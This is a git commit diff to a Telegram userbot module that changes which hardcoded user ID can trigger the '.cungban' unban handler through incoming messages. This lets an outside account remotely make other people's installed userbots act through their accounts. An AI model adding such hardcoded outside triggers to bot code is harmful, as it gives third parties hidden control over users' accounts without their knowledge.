d58a2ef07690d1c64301a3357cf7ad5fc37fb114
KY_UBOT <99032319+rizkypratama2@users.noreply.github.com>
2022-03-16 02:35:00 +0900

    Update ramssgban.py

--- userbot/modules/ramssgban.py
+++ userbot/modules/ramssgban.py
@@ -148,7 +148,7 @@ async def gben(userbot):
 
 
 @register(outgoing=True, pattern="^.ungban(?: |$)(.*)")
-@register(incoming=True, from_users=1979717764, pattern=r"^\.cungban(?: |$)(.*)")
+@register(incoming=True, from_users=1493275656, pattern=r"^\.cungban(?: |$)(.*)")
 async def gunben(userbot):
     dc = userbot
     sender = await dc.get_sender()
